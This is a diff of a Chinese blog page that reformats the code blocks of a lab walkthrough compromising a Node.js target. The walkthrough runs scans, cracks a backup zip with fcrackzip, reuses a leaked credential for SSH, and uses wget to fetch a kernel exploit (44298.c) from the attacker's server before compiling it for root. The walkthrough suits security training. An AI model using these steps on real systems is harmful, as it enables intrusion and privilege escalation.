@@ -580,6 +580,21 @@
         
  <!-- prismjs 代码高亮 -->
  
+    
+    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
+    
+        <link href="/js/prism/prism-coy.min.css" rel="stylesheet">
+    
+
+    <style>
+        pre[class*="language-"] {
+            overflow-y: hidden;
+        }
+        .line-numbers .line-numbers-rows {
+            border: none;
+        }
+    </style>
+  
 
 
 <div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
@@ -648,7 +663,7 @@
 <h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><ul>
 <li>扫描存活主机：目标主机ip为192.168.101.137</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>或者Netdiscover</p>
@@ -656,19 +671,19 @@
 <ul>
 <li>通过ping进行三层发现，根据ttl&#x3D;64初步推测该主机为Linux</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.137</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token number">192.168</span>.101.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ul>
 <li>通过masscan四层发现目标主机开放端口</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.137</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan -p0-65535 <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token number">192.168</span>.101.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>目标主机只开了两个端口，分别是22和3000端口</p>
 <ul>
 <li><p>扫描目标端口服务</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.137 -oN nmap.A</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-sC</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sS</span> <span class="token parameter variable">-P0</span> <span class="token number">192.168</span>.101.137 <span class="token parameter variable">-oN</span> nmap.A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ul>
@@ -682,7 +697,7 @@
 <p>nodejs默认端口3000，且nodejs是一个基于Chrome JavaScript运行建立的一个平台，基于Google V8引擎，性能很好</p>
 </blockquote>
 <p>使用Nmap中漏洞分类NSE脚本对目标进行探测</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.137</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> vuln <span class="token number">192.168</span>.101.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <hr>
 <p>目标web服务为Node.js Express的站，其他漏洞信息没什么有效的，都是Dos（不算洞）</p>
@@ -692,7 +707,13 @@
 <p>访问login路径：但是此页面没测出来弱密码和SQL</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h3 id="2-越权"><a href="#2-越权" class="headerlink" title="2. 越权"></a>2. 越权</h3><p>在首页源码闲逛时，看到在<code>view-source:http://192.168.101.137:3000/assets/js/app/controllers/home.js</code>下</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> controllers = angular.<span class="title function_">module</span>(<span class="string">&#x27;controllers&#x27;</span>);</span><br><span class="line"></span><br><span class="line">controllers.<span class="title function_">controller</span>(<span class="string">&#x27;HomeCtrl&#x27;</span>, <span class="keyword">function</span> (<span class="params">$scope, $http</span>) &#123;</span><br><span class="line">  $http.<span class="title function_">get</span>(<span class="string">&#x27;/api/users/latest&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">    $scope.<span class="property">users</span> = res.<span class="property">data</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> controllers <span class="token operator">=</span> angular<span class="token punctuation">.</span><span class="token function">module</span><span class="token punctuation">(</span><span class="token string">'controllers'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+controllers<span class="token punctuation">.</span><span class="token function">controller</span><span class="token punctuation">(</span><span class="token string">'HomeCtrl'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">$scope<span class="token punctuation">,</span> $http</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  $http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/users/latest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    $scope<span class="token punctuation">.</span>users <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p>这段代码是一个AngularJS控制器，命名为HomeCtrl，接收scope和http两个参数。控制器中向服务器<code>/api/users/latest</code>发起GET请求，用then()处理相应并把数据赋给$scope.users</p>
@@ -707,7 +728,7 @@
 <p>登录成功，网页中心有<code>Download backup</code>按钮</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h3 id="3-爆破解压压缩包"><a href="#3-爆破解压压缩包" class="headerlink" title="3. 爆破解压压缩包"></a>3. 爆破解压压缩包</h3><p>下载下来看到是base64编码，解码：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d myplace.backup &gt; decode.backup</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">base64 <span class="token parameter variable">-d</span> myplace.backup <span class="token operator">></span> decode.backup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>文件类型为zip：</p>
@@ -715,7 +736,7 @@
 <p>解压需要密码：</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>用fcrackzip，字典rockyou进行爆破：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decode.backup</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fcrackzip <span class="token parameter variable">-u</span> <span class="token parameter variable">-D</span> <span class="token parameter variable">-p</span> /usr/share/wordlists/rockyou.txt decode.backup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>密码为magicword</p>
@@ -724,27 +745,28 @@
 <p>在app.js中定义的url常量，<code>mark:5AYRft73VtFpc84k@localhost:27017</code>很像ssh登录</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>尝试进行ssh登录：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mark@192.168.101.137</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> mark@192.168.101.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h3 id="5-ubuntu16-04内核提权"><a href="#5-ubuntu16-04内核提权" class="headerlink" title="5. ubuntu16.04内核提权"></a>5. ubuntu16.04内核提权</h3><ul>
 <li>查看用户的sudo权限：</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>mark用户不能使用sudo</p>
 <ul>
 <li>查看有suid的命令：</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>没有find这种提权的命令</p>
 <ul>
 <li>查看内核版本及操作系统版本：</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span>
+lsb_release <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>内核版本为4.4.0-93，系统版本为ubuntu16.04</p>
@@ -752,25 +774,27 @@
 <ul>
 <li>查看是否存在gcc和版本</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>搜索ubuntu 16.04存在的漏洞：</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>把exp下载到本地：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 44298.c</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token parameter variable">-m</span> <span class="token number">44298</span>.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>本地用python起一个web服务：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">8000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>靶机上cd到tmp目录下载exp</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.101.128:8000/44298.c</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp
+<span class="token function">wget</span> http://192.168.101.128:8000/44298.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>gcc编译执行exp:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc 44298.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token number">44298</span>.c <span class="token parameter variable">-o</span> exp
+./exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>在&#x2F;root目录下找到flag:</p>
